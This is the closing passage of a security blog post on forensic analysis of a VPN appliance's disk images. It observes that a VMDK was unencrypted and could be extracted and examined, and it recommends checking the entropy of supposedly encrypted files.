<figure class="wp-block-image size-full"><a href="https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-11-3_11-45-33-1.png"><img loading="lazy" decoding="async" width="729" height="604" src="https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-11-3_11-45-33-1.png" alt="" class="wp-image-6291" srcset="https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-11-3_11-45-33-1.png 729w, https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-11-3_11-45-33-1-300x249.png 300w, https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-11-3_11-45-33-1-676x560.png 676w" sizes="(max-width: 729px) 100vw, 729px" /></a></figure>



<p>VMDK:</p>



<figure class="wp-block-image size-full"><a href="https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-11-3_11-45-12-1.png"><img loading="lazy" decoding="async" width="732" height="599" src="https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-11-3_11-45-12-1.png" alt="" class="wp-image-6292" srcset="https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-11-3_11-45-12-1.png 732w, https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-11-3_11-45-12-1-300x245.png 300w, https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-11-3_11-45-12-1-676x553.png 676w" sizes="(max-width: 732px) 100vw, 732px" /></a></figure>



<p>On the VMDK there seemed to be no encryption at all. It was possible to use 7Zip to extract the VMDK, mount the raw partition image and perform a forensic analysis of the data. That would not been possible with a fully encrypted VMDK.</p>



<p>Even if partial encryption is used, as for the log file, it would be possible to recover evidence from these images by file carving for forensic artifacts like Windows event logs.</p>



<p><strong>We therefore recommend to always check the entropy of encrypted files.</strong></p>

						
					</div> <!-- /post-content -->

					<div class="clear"></div>

					<div class="post-meta-bottom">

						<p class="post-categories"><span class="category-icon"><span class="front-flap"></span></span> <a href="https://blog.compass-security.com/category/forensic/" rel="category tag">Forensic</a>, <a href="https://blog.compass-security.com/category/incident-response/" rel="category tag">Incident Response</a>, <a href="https://blog.compass-security.com/category/write-up/" rel="category tag">Write-up</a></p>

						<p class="post-tags"><a href="https://blog.compass-security.com/tag/firewall/" rel="tag">Firewall</a><a href="https://blog.compass-security.com/tag/sonicwall/" rel="tag">SonicWall</a></p>
						<div class="clear"></div>

						<div class="post-nav">

							
								<a class="post-nav-older" title="Previous post: Weekly penetration tests for agile software – Does it work well?" href="https://blog.compass-security.com/2022/01/penetration-tests-agile-software/">

								<h5>Previous post</h5>
								Weekly penetration tests for agile software – Does it work well?
								</a>

							
							
								<a class="post-nav-newer" title="Next post: BloodHound Inner Workings &amp; Limitations – Part 1: User Rights Enumeration Through SAMR &amp; GPOLocalGroup" href="https://blog.compass-security.com/2022/05/bloodhound-inner-workings-part-1/">

								<h5>Next post</h5>
								BloodHound Inner Workings &amp; Limitations – Part 1: User Rights Enumeration Through SAMR &amp; GPOLocalGroup
								</a>

							
							<div class="clear"></div>

						</div> <!-- /post-nav -->

					</div> <!-- /post-meta-bottom -->

						<div id="respond" class="comment-respond">
		<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/2022/03/vpn-appliance-forensics/#respond" style="display:none;">Cancel reply</a></small></h3><form action="https://blog.compass-security.com/wp-comments-post.php" method="post" id="commentform" class="comment-form"><p class="comment-notes"><span id="email-notes">Your email address will not be published.</span> <span class="required-field-message">Required fields are marked <span class="required">*</span></span></p><p class="comment-form-comment"><label for="comment">Comment <span class="required">*</span></label> <textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" required="required"></textarea></p><p class="comment-form-author"><label for="author">Name <span class="required">*</span></label> <input id="author" name="author" type="text" value="" size="30" maxlength="245" autocomplete="name" required="required" /></p>
<p class="comment-form-email"><label for="email">Email <span class="required">*</span></label> <input id="email" name="email" type="text" value="" size="30" maxlength="100" aria-describedby="email-notes" autocomplete="email" required="required" /></p>
<input id="honeypot-field-url" style="display: none;" autocomplete="off" name="url" type="text" value="" size="30" maxlength="200" />
<p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Post Comment" /> <input type='hidden' name='comment_post_ID' value='6213' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
</p><input type="hidden" id="ct_checkjs_647bba344396e7c8170902bcf2e15551" name="ct_checkjs" value="0" /><script>setTimeout(function(){var ct_input_name = "ct_checkjs_647bba344396e7c8170902bcf2e15551";if (document.getElementById(ct_input_name) !== null) {var ct_input_value = document.getElementById(ct_input_name).value;document.getElementById(ct_input_name).value = document.getElementById(ct_input_name).value.replace(ct_input_value, '1205255341');}}, 1000);</script></form>	</div><!-- #respond -->
	
			   	
			</div> <!-- /post -->

		</div> <!-- /posts -->

	</div> <!-- /content -->

	
	<div class="sidebar right" role="complementary">
		
		<div id="recent-posts-8" class="widget widget_recent_entries"><div class="widget-content">
		<h3 class="widget-title">Recent Posts</h3>
		<ul>
											<li>
					<a href="https://blog.compass-security.com/2024/12/a-nifty-initial-access-payload/">A Nifty Initial Access Payload</a>
									</li>
											<li>
					<a href="https://blog.compass-security.com/2024/12/harvesting-gitlab-pipeline-secrets/">Harvesting GitLab Pipeline Secrets</a>
									</li>
											<li>
					<a href="https://blog.compass-security.com/2024/11/a-look-back-insights-from-our-managed-bug-bounty-program/">A Look Back: Insights from Our Managed Bug Bounty Program</a>
									</li>
											<li>
					<a href="https://blog.compass-security.com/2024/10/email-email-on-the-wall-who-sent-you-after-all/">Email, Email on the Wall, Who Sent You, After All?</a>
									</li>
											<li>
					<a href="https://blog.compass-security.com/2024/10/voice-cloning-with-deep-learning-models/">Voice  Cloning with Deep Learning Models</a>
									</li>
					</ul>

		</div></div><div id="categories-4" class="widget widget_categories"><div class="widget-content"><h3 class="widget-title">Categories</h3><form action="https://blog.compass-security.com" method="get"><label class="screen-reader-text" for="cat">Categories</label><select  name='cat' id='cat' class='postform'>
	<option value='-1'>Select Category</option>
	<option class="level-0" value="222">APT&nbsp;&nbsp;(8)</option>
	<option class="level-0" value="452">Authentication&nbsp;&nbsp;(16)</option>
	<option class="level-0" value="606">Bug Bounty&nbsp;&nbsp;(6)</option>
	<option class="level-0" value="567">Entra ID&nbsp;&nbsp;(1)</option>
	<option class="level-0" value="479">Evasion&nbsp;&nbsp;(3)</option>
	<option class="level-0" value="116">Event&nbsp;&nbsp;(34)</option>
	<option class="level-0" value="207">Exploiting&nbsp;&nbsp;(17)</option>
	<option class="level-0" value="7">Forensic&nbsp;&nbsp;(24)</option>
	<option class="level-0" value="9">Hacking-Lab&nbsp;&nbsp;(18)</option>
	<option class="level-0" value="105">Hardening&nbsp;&nbsp;(33)</option>
	<option class="level-0" value="356">Incident Response&nbsp;&nbsp;(13)</option>
	<option class="level-0" value="136">Industrial Control Systems&nbsp;&nbsp;(14)</option>
	<option class="level-0" value="231">Information Leakage&nbsp;&nbsp;(7)</option>
	<option class="level-0" value="311">Internet of Things&nbsp;&nbsp;(14)</option>
	<option class="level-0" value="576">Job&nbsp;&nbsp;(1)</option>
	<option class="level-0" value="106">Linux&nbsp;&nbsp;(8)</option>
	<option class="level-0" value="226">Log Management&nbsp;&nbsp;(6)</option>
	<option class="level-0" value="477">Machine Learning&nbsp;&nbsp;(3)</option>
	<option class="level-0" value="478">Malware Detection&nbsp;&nbsp;(6)</option>
	<option class="level-0" value="239">Mobile&nbsp;&nbsp;(10)</option>
	<option class="level-0" value="240">Networking&nbsp;&nbsp;(13)</option>
	<option class="level-0" value="208">OS X&nbsp;&nbsp;(1)</option>
	<option class="level-0" value="10">Patch&nbsp;&nbsp;(6)</option>
	<option class="level-0" value="64">Penetration Test&nbsp;&nbsp;(54)</option>
	<option class="level-0" value="417">Red Teaming&nbsp;&nbsp;(11)</option>
	<option class="level-0" value="111">Research&nbsp;&nbsp;(72)</option>
	<option class="level-0" value="65">Reversing&nbsp;&nbsp;(13)</option>
	<option class="level-0" value="175">Risk Assessment&nbsp;&nbsp;(10)</option>
	<option class="level-0" value="561">Scam&nbsp;&nbsp;(1)</option>
	<option class="level-0" value="135">Standards&nbsp;&nbsp;(10)</option>
	<option class="level-0" value="453">SuisseID&nbsp;&nbsp;(1)</option>
	<option class="level-0" value="63">Talk&nbsp;&nbsp;(22)</option>
	<option class="level-0" value="331">Tools&nbsp;&nbsp;(24)</option>
	<option class="level-0" value="5">Training&nbsp;&nbsp;(19)</option>
	<option class="level-0" value="1">Uncategorized&nbsp;&nbsp;(19)</option>
	<option class="level-0" value="8">Vulnerability&nbsp;&nbsp;(44)</option>
	<option class="level-0" value="54">Web Application&nbsp;&nbsp;(50)</option>
	<option class="level-0" value="454">Web Server&nbsp;&nbsp;(13)</option>
	<option class="level-0" value="451">Windows&nbsp;&nbsp;(29)</option>
	<option class="level-0" value="298">Wireless&nbsp;&nbsp;(6)</option>
	<option class="level-0" value="329">Write-up&nbsp;&nbsp;(26)</option>
</select>
</form><script type="text/javascript">
/* <![CDATA[ */

(function() {
	var dropdown = document.getElementById( "cat" );
	function onCatChange() {
		if ( dropdown.options[ dropdown.selectedIndex ].value > 0 ) {
			dropdown.parentNode.submit();
		}
	}
	dropdown.onchange = onCatChange;
})();

/* ]]> */
</script>
</div></div><div id="tag_cloud-7" class="widget widget_tag_cloud"><div class="widget-content"><h3 class="widget-title">Tags</h3><div class="tagcloud"><a href="https://blog.compass-security.com/tag/active-directory/" class="tag-cloud-link tag-link-84 tag-link-position-1" style="font-size: 15.241379310345pt;" aria-label="Active Directory (9 items)">Active Directory</a>
<a href="https://blog.compass-security.com/tag/advanced-metering-infrastructure/" class="tag-cloud-link tag-link-144 tag-link-position-2" style="font-size: 9.9310344827586pt;" aria-label="Advanced Metering Infrastructure (5 items)">Advanced Metering Infrastructure</a>
<a href="https://blog.compass-security.com/tag/advisory/" class="tag-cloud-link tag-link-60 tag-link-position-3" style="font-size: 11.620689655172pt;" aria-label="Advisory (6 items)">Advisory</a>
<a href="https://blog.compass-security.com/tag/android/" class="tag-cloud-link tag-link-193 tag-link-position-4" style="font-size: 8pt;" aria-label="Android (4 items)">Android</a>
<a href="https://blog.compass-security.com/tag/application-security/" class="tag-cloud-link tag-link-103 tag-link-position-5" style="font-size: 9.9310344827586pt;" aria-label="Application Security (5 items)">Application Security</a>
<a href="https://blog.compass-security.com/tag/asfws/" class="tag-cloud-link tag-link-125 tag-link-position-6" style="font-size: 20.793103448276pt;" aria-label="ASFWS (16 items)">ASFWS</a>
<a href="https://blog.compass-security.com/tag/asp-net/" class="tag-cloud-link tag-link-194 tag-link-position-7" style="font-size: 14.034482758621pt;" aria-label="ASP.NET (8 items)">ASP.NET</a>
<a href="https://blog.compass-security.com/tag/black-hat/" class="tag-cloud-link tag-link-186 tag-link-position-8" style="font-size: 15.241379310345pt;" aria-label="Black Hat (9 items)">Black Hat</a>
<a href="https://blog.compass-security.com/tag/bloodhound/" class="tag-cloud-link tag-link-436 tag-link-position-9" style="font-size: 11.620689655172pt;" aria-label="bloodhound (6 items)">bloodhound</a>
<a href="https://blog.compass-security.com/tag/burp/" class="tag-cloud-link tag-link-263 tag-link-position-10" style="font-size: 8pt;" aria-label="Burp (4 items)">Burp</a>
<a href="https://blog.compass-security.com/tag/burp-extension/" class="tag-cloud-link tag-link-264 tag-link-position-11" style="font-size: 8pt;" aria-label="Burp Extension (4 items)">Burp Extension</a>
<a href="https://blog.compass-security.com/tag/conference/" class="tag-cloud-link tag-link-202 tag-link-position-12" style="font-size: 18.862068965517pt;" aria-label="Conference (13 items)">Conference</a>
<a href="https://blog.compass-security.com/tag/ctf/" class="tag-cloud-link tag-link-280 tag-link-position-13" style="font-size: 20.793103448276pt;" aria-label="CTF (16 items)">CTF</a>
<a href="https://blog.compass-security.com/tag/cve/" class="tag-cloud-link tag-link-441 tag-link-position-14" style="font-size: 9.9310344827586pt;" aria-label="CVE (5 items)">CVE</a>
<a href="https://blog.compass-security.com/tag/defcon/" class="tag-cloud-link tag-link-118 tag-link-position-15" style="font-size: 9.9310344827586pt;" aria-label="Defcon (5 items)">Defcon</a>
<a href="https://blog.compass-security.com/tag/dfir/" class="tag-cloud-link tag-link-297 tag-link-position-16" style="font-size: 9.9310344827586pt;" aria-label="DFIR (5 items)">DFIR</a>
<a href="https://blog.compass-security.com/tag/exchange/" class="tag-cloud-link tag-link-248 tag-link-position-17" style="font-size: 9.9310344827586pt;" aria-label="Exchange (5 items)">Exchange</a>
<a href="https://blog.compass-security.com/tag/hardening/" class="tag-cloud-link tag-link-76 tag-link-position-18" style="font-size: 17.172413793103pt;" aria-label="Hardening (11 items)">Hardening</a>
<a href="https://blog.compass-security.com/tag/html/" class="tag-cloud-link tag-link-134 tag-link-position-19" style="font-size: 9.9310344827586pt;" aria-label="HTML (5 items)">HTML</a>
<a href="https://blog.compass-security.com/tag/insomnihack/" class="tag-cloud-link tag-link-330 tag-link-position-20" style="font-size: 20.068965517241pt;" aria-label="Insomni&#039;hack (15 items)">Insomni&#039;hack</a>
<a href="https://blog.compass-security.com/tag/less/" class="tag-cloud-link tag-link-108 tag-link-position-21" style="font-size: 9.9310344827586pt;" aria-label="less (5 items)">less</a>
<a href="https://blog.compass-security.com/tag/linux-2/" class="tag-cloud-link tag-link-110 tag-link-position-22" style="font-size: 9.9310344827586pt;" aria-label="Linux (5 items)">Linux</a>
<a href="https://blog.compass-security.com/tag/logging/" class="tag-cloud-link tag-link-228 tag-link-position-23" style="font-size: 12.827586206897pt;" aria-label="Logging (7 items)">Logging</a>
<a href="https://blog.compass-security.com/tag/microsoft/" class="tag-cloud-link tag-link-195 tag-link-position-24" style="font-size: 17.896551724138pt;" aria-label="Microsoft (12 items)">Microsoft</a>
<a href="https://blog.compass-security.com/tag/ntlm/" class="tag-cloud-link tag-link-465 tag-link-position-25" style="font-size: 9.9310344827586pt;" aria-label="ntlm (5 items)">ntlm</a>
<a href="https://blog.compass-security.com/tag/penetration-testing/" class="tag-cloud-link tag-link-266 tag-link-position-26" style="font-size: 8pt;" aria-label="Penetration Testing (4 items)">Penetration Testing</a>
<a href="https://blog.compass-security.com/tag/phishing/" class="tag-cloud-link tag-link-336 tag-link-position-27" style="font-size: 11.620689655172pt;" aria-label="phishing (6 items)">phishing</a>
<a href="https://blog.compass-security.com/tag/poc/" class="tag-cloud-link tag-link-37 tag-link-position-28" style="font-size: 9.9310344827586pt;" aria-label="PoC (5 items)">PoC</a>
<a href="https://blog.compass-security.com/tag/privilege-escalation/" class="tag-cloud-link tag-link-320 tag-link-position-29" style="font-size: 9.9310344827586pt;" aria-label="Privilege Escalation (5 items)">Privilege Escalation</a>
<a href="https://blog.compass-security.com/tag/pwn2own/" class="tag-cloud-link tag-link-574 tag-link-position-30" style="font-size: 11.620689655172pt;" aria-label="Pwn2Own (6 items)">Pwn2Own</a>
<a href="https://blog.compass-security.com/tag/relay/" class="tag-cloud-link tag-link-162 tag-link-position-31" style="font-size: 9.9310344827586pt;" aria-label="relay (5 items)">relay</a>
<a href="https://blog.compass-security.com/tag/research/" class="tag-cloud-link tag-link-30 tag-link-position-32" style="font-size: 22pt;" aria-label="Research (18 items)">Research</a>
<a href="https://blog.compass-security.com/tag/saml/" class="tag-cloud-link tag-link-262 tag-link-position-33" style="font-size: 12.827586206897pt;" aria-label="SAML (7 items)">SAML</a>
<a href="https://blog.compass-security.com/tag/saml-raider/" class="tag-cloud-link tag-link-265 tag-link-position-34" style="font-size: 9.9310344827586pt;" aria-label="SAML Raider (5 items)">SAML Raider</a>
<a href="https://blog.compass-security.com/tag/security/" class="tag-cloud-link tag-link-114 tag-link-position-35" style="font-size: 11.620689655172pt;" aria-label="Security (6 items)">Security</a>
<a href="https://blog.compass-security.com/tag/sharepoint/" class="tag-cloud-link tag-link-196 tag-link-position-36" style="font-size: 9.9310344827586pt;" aria-label="SharePoint (5 items)">SharePoint</a>
<a href="https://blog.compass-security.com/tag/smart-grid/" class="tag-cloud-link tag-link-137 tag-link-position-37" style="font-size: 8pt;" aria-label="Smart Grid (4 items)">Smart Grid</a>
<a href="https://blog.compass-security.com/tag/social-engineering/" class="tag-cloud-link tag-link-15 tag-link-position-38" style="font-size: 11.620689655172pt;" aria-label="Social Engineering (6 items)">Social Engineering</a>
<a href="https://blog.compass-security.com/tag/sudo/" class="tag-cloud-link tag-link-107 tag-link-position-39" style="font-size: 9.9310344827586pt;" aria-label="sudo (5 items)">sudo</a>
<a href="https://blog.compass-security.com/tag/sudoers/" class="tag-cloud-link tag-link-109 tag-link-position-40" style="font-size: 9.9310344827586pt;" aria-label="sudoers (5 items)">sudoers</a>
<a href="https://blog.compass-security.com/tag/vulnerability-2/" class="tag-cloud-link tag-link-27 tag-link-position-41" style="font-size: 19.586206896552pt;" aria-label="Vulnerability (14 items)">Vulnerability</a>
<a href="https://blog.compass-security.com/tag/web/" class="tag-cloud-link tag-link-268 tag-link-position-42" style="font-size: 8pt;" aria-label="web (4 items)">web</a>
<a href="https://blog.compass-security.com/tag/web-security/" class="tag-cloud-link tag-link-289 tag-link-position-43" style="font-size: 11.620689655172pt;" aria-label="Web Security (6 items)">Web Security</a>
<a href="https://blog.compass-security.com/tag/xss/" class="tag-cloud-link tag-link-51 tag-link-position-44" style="font-size: 17.172413793103pt;" aria-label="XSS (11 items)">XSS</a>
<a href="https://blog.compass-security.com/tag/xxe/" class="tag-cloud-link tag-link-104 tag-link-position-45" style="font-size: 11.620689655172pt;" aria-label="XXE (6 items)">XXE</a></div>
</div></div>	</div><!-- .sidebar -->
	

	<div class="clear"></div>

</div> <!-- /wrapper -->

<div class="footer section large-padding bg-dark">

    <div class="footer-inner section-inner">

        
            <div class="column column-1 left">

                <div class="widgets">

                    <div id="block-10" class="widget widget_block"><div class="widget-content"><h3 class="widget-title">Compass Links</h3>
<ul class="xoxo blogroll">
<li><a href="https://www.compass-security.com/en/" target="_blank">Compass Website</a></li>
<li><a href="https://www.compass-security.com/en/products/filebox/" target="_blank">FileBox</a></li>
<li><a href="https://www.hacking-lab.com/" target="_blank">Hacking-Lab</a></li>
<li><a href="https://www.compass-security.com/en/imprint" target="_blank">Impressum</a></li>
<li><a href="https://www.compass-security.com/en/legal" target="_blank">Legal</a></li>
<li><a href="https://blog.compass-security.com/feed/" target="_blank">RSS Feed</a></li>
</ul></div></div>
                </div>

            </div>

         <!-- /footer-a -->

         <!-- /footer-b -->

        <div class="clear"></div>

    </div> <!-- /footer-inner -->

</div> <!-- /footer -->

<div class="credits section bg-dark no-padding">

    <div class="credits-inner section-inner">

        <p class="credits-left">

            &copy; 2024 <a href="https://blog.compass-security.com"
                                              title="Compass Security Blog">Compass Security Blog</a>

        </p>

        <p class="credits-right">

            <span><a title="To the top"
                     class="tothetop">Up &uarr;</a>

        </p>

        <div class="clear"></div>

    </div> <!-- /credits-inner -->

</div> <!-- /credits -->

</div> <!-- /big-wrapper -->

<script type="text/javascript" src="https://blog.compass-security.com/wp-includes/js/comment-reply.min.js?ver=6.6.2" id="comment-reply-js" async="async" data-wp-strategy="async"></script>
<script type="text/javascript" src="https://blog.compass-security.com/wp-content/themes/compass_security/js/search.js?ver=6.6.2" id="child_search-js"></script>
<script type="text/javascript" src="https://blog.compass-security.com/wp-content/themes/hemingway/assets/js/global.js?ver=2.3.2" id="hemingway_global-js"></script>
<script type="text/javascript" src="https://blog.compass-security.com/wp-content/plugins/wp-featherlight/js/wpFeatherlight.pkgd.min.js?ver=1.3.4" id="wp-featherlight-js"></script>
<script type="text/javascript" src="https://blog.compass-security.com/wp-content/plugins/enlighter/cache/enlighterjs.min.js?ver=bolAfeK8q5zoJbL" id="enlighterjs-js"></script>
<script type="text/javascript" id="enlighterjs-js-after">
/* <![CDATA[ */
!function(e,n){if("undefined"!=typeof EnlighterJS){var o={"selectors":{"block":"pre.EnlighterJSRAW","inline":"code.EnlighterJSRAW"},"options":{"indent":2,"ampersandCleanup":true,"linehover":true,"rawcodeDbclick":false,"textOverflow":"break","linenumbers":true,"theme":"godzilla","language":"generic","retainCssClasses":false,"collapse":false,"toolbarOuter":"","toolbarTop":"{BTN_RAW}{BTN_COPY}{BTN_WINDOW}{BTN_WEBSITE}","toolbarBottom":""}};(e.EnlighterJSINIT=function(){EnlighterJS.init(o.selectors.block,o.selectors.inline,o.options)})()}else{(n&&(n.error||n.log)||function(){})("Error: EnlighterJS resources not loaded yet!")}}(window,console);
/* ]]> */
</script>

</body>
</html>
<!--
Performance optimized by Redis Object Cache. Learn more: https://wprediscache.com

Retrieved 1632 objects (463 KB) from Redis using PhpRedis (v6.0.2).
-->
